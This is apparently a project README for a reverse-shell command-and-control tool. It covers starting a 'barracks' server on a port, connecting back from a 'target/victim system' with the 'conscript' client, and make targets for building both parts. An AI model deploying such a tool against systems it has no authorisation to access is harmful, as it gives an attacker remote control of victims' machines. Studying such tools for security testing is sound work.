# Shell Alert 2

Based of the work done by [adedayo](https://github.com/adedayo/reverse-shell).

## Usage

Start command and control server (`barracks`)

```bash
barracks 1337
```

Now connect from the target/victim system using the client (`conscript`), specifying the hostname/ip of the barracks, and port that the barracks is listening on (1337 in our example)
```bash
conscript <ip/hostname of barracks> <port of barracks>
```

## Build

Build C&C servers to `./bin/buildings` 

```
make buildings
```

Build clients to `./bin/units` 

```
make units
```

Build everything

```
make all
```

